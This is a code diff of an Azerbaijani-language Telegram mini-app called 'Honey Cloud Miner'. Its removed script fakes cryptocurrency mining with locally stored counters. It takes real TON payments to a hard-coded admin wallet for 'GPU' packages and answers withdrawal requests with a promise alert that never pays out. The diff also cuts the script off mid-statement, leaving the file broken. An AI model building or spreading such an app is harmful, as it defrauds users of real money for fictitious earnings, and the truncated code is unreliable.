@@ -160,7 +160,6 @@
             margin: 10px 0;
             text-align: center;
         }
-        /* Tapşırıqlar UI Dizaynı */
         .task-item {
             display: flex;
             justify-content: space-between;
@@ -347,11 +346,10 @@
         </div>
     </div>
 
-    <!-- TAPŞIRIQLAR TABI (MARAQLI VƏ ZƏNGİN) -->
+    <!-- TAPŞIRIQLAR TABI -->
     <div id="tab-gorevler" class="tab-content">
         <h3 style="margin-bottom:12px; font-size:16px; text-align:center;">📋 Günlük Tapşırıqlar & Bonuslar</h3>
         
-        <!-- Günlük Giriş Bonusu -->
         <div class="card">
             <h4 style="font-size:14px; margin-bottom:4px;">📅 Günlük Giriş Bonusu</h4>
             <p style="color:#8a8d9b; font-size:11px;">Hər gün daxil olun, pulsuz GPU güc qazanın!</p>
@@ -364,7 +362,6 @@
             <button class="btn-buy" style="margin-top:10px;" id="btn-daily-claim" onclick="claimDailyReward()">🎁 Bugünkü Bonusu Götür (+50 GPU)</button>
         </div>
 
-        <!-- Sosial & Aktivlik Tapşırıqları -->
         <div class="card">
             <h4 style="font-size:14px; margin-bottom:8px;">📢 Sosial Media Tapşırıqları</h4>
 
@@ -437,6 +434,7 @@
         const tg = window.Telegram?.WebApp;
         if (tg) { tg.expand(); }
 
+        const BOT_USERNAME = "Honeyfarmbot";
         const ADMIN_WALLET = 'UQDkUQOUUt1ftSRRNkExQou9cVUhaWXusxBDNrNA9EUk5E9D';
         let tonConnectUI = null;
 
@@ -447,267 +445,10 @@
             });
         } catch(e) {}
 
+        // Telegram ID alımı ve referans bağlantısı oluşturma
         const userId = tg?.initDataUnsafe?.user?.id || Math.floor(Math.random() * 899999) + 100000;
-        const refLink = `https://t.me/Honeyfarmbot?start=ref_${userId}`;
+        const refLink = `https://t.me/${BOT_USERNAME}?start=ref_${userId}`;
         document.getElementById('ref-link-display').innerText = refLink;
 
         let invitedCount = parseInt(localStorage.getItem('invited_count')) || 0;
-        document.getElementById('invited-count').innerText = invitedCount + " nəfər";
-
-        let hashes = parseFloat(localStorage.getItem('user_hashes')) || 0.00000;
-        let usdtBalance = parseFloat(localStorage.getItem('user_usdt')) || 0.000000;
-        
-        let activePackages = JSON.parse(localStorage.getItem('active_packages')) || [];
-        let nowTime = Date.now();
-        
-        activePackages = activePackages.filter(pkg => pkg.expireTime > nowTime);
-        localStorage.setItem('active_packages', JSON.stringify(activePackages));
-
-        let bonusTasksGpu = parseInt(localStorage.getItem('tasks_gpu')) || 0;
-        let baseGpu = 2000;
-        let bonusGpu = activePackages.reduce((sum, pkg) => sum + pkg.gpu, 0);
-        let refGpu = invitedCount * 200;
-        let gpuPower = baseGpu + bonusGpu + refGpu + bonusTasksGpu;
-
-        document.getElementById('gpu-power').innerText = gpuPower;
-        document.getElementById('usdt-balance').innerText = usdtBalance.toFixed(6);
-
-        const TWENTY_FOUR_HOURS = 24 * 60 * 60 * 1000;
-        let endTime = localStorage.getItem('mining_end_time');
-
-        function updateUI() {
-            let now = Date.now();
-            
-            if (endTime && now < parseInt(endTime)) {
-                let remaining = Math.floor((parseInt(endTime) - now) / 1000);
-                let h = String(Math.floor(remaining / 3600)).padStart(2, '0');
-                let m = String(Math.floor((remaining % 3600) / 60)).padStart(2, '0');
-                let s = String(remaining % 60).padStart(2, '0');
-
-                document.getElementById('timer').innerText = `${h}:${m}:${s}`;
-                document.getElementById('status-title').innerText = "MAYNİNQ AKTİVDİR";
-                document.getElementById('status-title').style.color = "#27ae60";
-                
-                const startBtn = document.getElementById('start-btn');
-                startBtn.disabled = true;
-                startBtn.innerText = "⚡ MAYNİNQ DAVAM EDİR";
-
-                let speed = (gpuPower / 2000) * 0.00012;
-                hashes += speed;
-                localStorage.setItem('user_hashes', hashes);
-
-                document.getElementById('hash-count').innerText = hashes.toFixed(5);
-                document.getElementById('mined-hashes').innerText = hashes.toFixed(5);
-            } else {
-                document.getElementById('timer').innerText = "00:00:00";
-                document.getElementById('status-title').innerText = "MAYNİNQ DAYANIB (STARTA BASIN)";
-                document.getElementById('status-title').style.color = "#e74c3c";
-                
-                const startBtn = document.getElementById('start-btn');
-                startBtn.disabled = false;
-                startBtn.innerText = "⚡ MAYNİNQİ BAŞLAT (24 SAAT)";
-
-                document.getElementById('hash-count').innerText = hashes.toFixed(5);
-                document.getElementById('mined-hashes').innerText = hashes.toFixed(5);
-            }
-        }
-
-        function startMining24h() {
-            let now = Date.now();
-            endTime = now + TWENTY_FOUR_HOURS;
-            localStorage.setItem('mining_end_time', endTime);
-            updateUI();
-        }
-
-        setInterval(updateUI, 1000);
-
-        async function buyVipPackage(amountInTon, addedGpu, days) {
-            if (!tonConnectUI || !tonConnectUI.connected) {
-                alert("Ödəniş etmək üçün əvvəlcə 'Çıxarış' bölməsindən cüzdanınızı qoşun!");
-                switchTab('cek');
-                return;
-            }
-
-            const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 600,
-                messages: [
-                    {
-                        address: ADMIN_WALLET,
-                        amount: (amountInTon * 1000000000).toString()
-                    }
-                ]
-            };
-
-            try {
-                await tonConnectUI.sendTransaction(transaction);
-                
-                let expireTime = Date.now() + (days * 24 * 60 * 60 * 1000);
-                activePackages.push({ gpu: addedGpu, expireTime: expireTime });
-                localStorage.setItem('active_packages', JSON.stringify(activePackages));
-
-                gpuPower += addedGpu;
-                document.getElementById('gpu-power').innerText = gpuPower;
-
-                alert(`Ödəniş uğurla tamamlandı! +${addedGpu} GPU gücünüz ${days} günlük aktivləşdirildi.`);
-                switchTab('kazici');
-            } catch (e) {
-                alert("Ödəniş ləğv edildi və ya xəta baş verdi.");
-            }
-        }
-
-        function exchangeHashes() {
-            if(hashes > 0.001) {
-                let converted = hashes * 0.0001;
-                usdtBalance += converted;
-                localStorage.setItem('user_usdt', usdtBalance);
-                alert(hashes.toFixed(5) + " Hash USDT-yə çevrildi!");
-                hashes = 0;
-                localStorage.setItem('user_hashes', 0);
-                document.getElementById('usdt-balance').innerText = usdtBalance.toFixed(6);
-                document.getElementById('hash-count').innerText = "0.00000";
-                document.getElementById('mined-hashes').innerText = "0.00000";
-            } else {
-                alert("Çevriləcək kifayət qədər hash yoxdur!");
-            }
-        }
-
-        function requestWithdrawal() {
-            if (!tonConnectUI || !tonConnectUI.connected) {
-                alert("Zəhmət olmasa əvvəlcə TON Cüzdanınızı qoşun!");
-                return;
-            }
-            if (usdtBalance < 5.00) {
-                alert("Minimum çıxarış məbləği 5.00 USDT-dir! Balansınız yetərsizdir.");
-                return;
-            }
-            alert("Çıxarış sorğunuz qəbul edildi. Təsdiqləndikdən sonra 10% komissiya çıxılmaqla cüzdanınıza köçürüləcək.");
-        }
-
-        function copyReferralLink() {
-            navigator.clipboard.writeText(refLink).then(() => {
-                alert('Referal linkiniz buferə kopyalandı!');
-            }).catch(() => {
-                alert('Link kopyalandı: ' + refLink);
-            });
-        }
-
-        function shareReferralLink() {
-            const shareText = encodeURIComponent("🚀 Honey Cloud Miner-də pulsuz USDT qazan! Aşağıdakı linklə qoşul və +200 GPU hədiyyə qazan:");
-            const fullShareUrl = `https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${shareText}`;
-            if (tg) {
-                tg.openTelegramLink(fullShareUrl);
-            } else {
-                window.open(fullShareUrl, '_blank');
-            }
-        }
-
-        // Tapşırıqlar Məntiqi
-        function claimDailyReward() {
-            let lastClaim = localStorage.getItem('last_daily_claim');
-            let today = new Date().toDateString();
-
-            if (lastClaim === today) {
-                alert('Siz bugünkü bonusu artıq götürmüsünüz! Sabah yenidən cəhd edin.');
-                return;
-            }
-
-            localStorage.setItem('last_daily_claim', today);
-            bonusTasksGpu += 50;
-            localStorage.setItem('tasks_gpu', bonusTasksGpu);
-            gpuPower += 50;
-            document.getElementById('gpu-power').innerText = gpuPower;
-
-            const btn = document.getElementById('btn-daily-claim');
-            btn.innerText = "✅ Bugünkü Bonus Götürüldü";
-            btn.disabled = true;
-
-            alert('Təbriklər! +50 GPU Günlük Giriş Bonusu hesabınıza əlavə olundu.');
-        }
-
-        function completeTask(taskId, url, rewardGpu) {
-            let completed = localStorage.getItem('task_' + taskId);
-            if (completed) {
-                alert('Bu tapşırıq artıq yerinə yetirilib!');
-                return;
-            }
-
-            window.open(url, '_blank');
-
-            setTimeout(() => {
-                localStorage.setItem('task_' + taskId, 'true');
-                bonusTasksGpu += rewardGpu;
-                localStorage.setItem('tasks_gpu', bonusTasksGpu);
-                gpuPower += rewardGpu;
-                document.getElementById('gpu-power').innerText = gpuPower;
-
-                const btn = document.getElementById('task-' + taskId);
-                if (btn) {
-                    btn.innerText = "✅ Tamamlandı";
-                    btn.disabled = true;
-                }
-                alert(`Təbriklər! +${rewardGpu} GPU güc hesabınıza əlavə olundu.`);
-            }, 3000);
-        }
-
-        function completeWalletTask() {
-            let completed = localStorage.getItem('task_wallet');
-            if (completed) {
-                alert('Cüzdan qoşma bonusu artıq götürülüb!');
-                return;
-            }
-
-            if (tonConnectUI && tonConnectUI.connected) {
-                localStorage.setItem('task_wallet', 'true');
-                bonusTasksGpu += 250;
-                localStorage.setItem('tasks_gpu', bonusTasksGpu);
-                gpuPower += 250;
-                document.getElementById('gpu-power').innerText = gpuPower;
-
-                const btn = document.getElementById('task-wallet');
-                if (btn) {
-                    btn.innerText = "✅ Tamamlandı";
-                    btn.disabled = true;
-                }
-                alert('Təbriklər! Cüzdan qoşulduğu üçün +250 GPU hədiyyə olundu.');
-            } else {
-                alert('Zəhmət olmasa əvvəlcə "Çıxarış" bölməsindən cüzdanınızı qoşun!');
-                switchTab('cek');
-            }
-        }
-
-        // Tapşırıq Düymələrinin Vəziyyətini Yoxla
-        window.addEventListener('load', () => {
-            let lastClaim = localStorage.getItem('last_daily_claim');
-            let today = new Date().toDateString();
-            if (lastClaim === today) {
-                const btn = document.getElementById('btn-daily-claim');
-                if(btn) {
-                    btn.innerText = "✅ Bugünkü Bonus Götürüldü";
-                    btn.disabled = true;
-                }
-            }
-
-            ['tg', 'group', 'yt', 'wallet'].forEach(taskId => {
-                if (localStorage.getItem('task_' + taskId)) {
-                    const btn = document.getElementById('task-' + taskId);
-                    if (btn) {
-                        btn.innerText = "✅ Tamamlandı";
-                        btn.disabled = true;
-                    }
-                }
-            });
-        });
-
-        function switchTab(tabName) {
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-
-            const targetTab = document.getElementById('tab-' + tabName);
-            const targetNav = document.getElementById('nav-' + tabName);
-
-            if(targetTab) targetTab.classList.add('active');
-            if(targetNav) targetNav.classList.add('active');
-        }
-    </script>
-</body>
-</html>
+        document.getElementById('invited-count').innerText = invitedCount +
